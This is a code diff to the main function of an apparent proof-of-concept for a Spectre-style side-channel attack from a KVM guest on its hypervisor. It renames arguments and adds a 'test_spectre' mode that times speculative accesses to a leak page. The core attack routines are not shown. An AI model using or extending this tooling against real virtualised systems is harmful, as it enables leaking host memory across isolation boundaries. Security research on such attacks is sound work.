@@ -232,34 +232,47 @@ int main(int argc, char *argv[argc]) {
 
   // Use this to get physical address of the leak page with the
   // kvm_assist.ko module in the hypervisor
-  if (!strncmp(argv[1], "determine", 10)) {
+  if (!strcmp(argv[1], "determine")) {
     *(uint64_t *)leak_page = page_value;
     getchar();
     *(uint64_t *)leak_page = 0;
-  } else if (!strncmp(argv[1], "calc_min", 9)) {
+  } else if (!strcmp(argv[1], "calc_min")) {
     if (argc <= 3) {
       errno = EINVAL;
-      err(errno, "missing args, requires [phys addr of buf] [phys_map addr]");
+      err(errno, "missing args, requires [leak page addr] [apic map addr]");
     }
-    // First, phys addr
-    // Second phys map addr
-
     char *endptr = NULL;
-    uintptr_t page_addr = strtoull(argv[2], &endptr, 16);
+    uintptr_t leak_page_addr = strtoull(argv[2], &endptr, 16);
     if (endptr == argv[2]) {
       errno = EINVAL;
-      err(errno, "Could not parse phys addr of page");
+      err(errno, "Could not parse phys addr of leak page");
     }
 
-    uintptr_t phys_map_addr = strtoull(argv[3], &endptr, 16);
+    uintptr_t apic_map_addr = strtoull(argv[3], &endptr, 16);
     if (endptr == argv[3]) {
       errno = EINVAL;
-      err(EINVAL, "Could not parse phys addr of phys_map");
+      err(errno, "Could not parse phys addr of apic map");
     }
 
-    size_t min = calculate_min(page_addr, phys_map_addr);
+    size_t min = calculate_min(leak_page_addr, apic_map_addr);
     printf("Min: %ld (or 0x%lx)\n", min, min);
-  } else if (!strncmp(argv[1], "find_min", 9)) {
+  } else if (!strcmp(argv[1], "test_spectre")) {
+    if (argc <= 2) {
+      errno = EINVAL;
+      err(errno, "missing args, requires min");
+    }
+    char *endptr = NULL;
+    uintptr_t min = strtoull(argv[2], &endptr, 16);
+    if (endptr == argv[2]) {
+      errno = EINVAL;
+      err(errno, "Could not parse min");
+    }
+
+    const size_t iterations = 10000;
+    size_t miss = access_buffer_with_spectre(leak_page, ~min, iterations);
+    size_t hit = access_buffer_with_spectre(leak_page, min, iterations);
+    printf("Miss: %ld\tHit: %ld\n", miss, hit);
+  } else if (!strcmp(argv[1], "find_min")) {
     size_t min = find_min(leak_page);
     printf("Min: %ld (or 0x%lx)\n", min, min);
   }
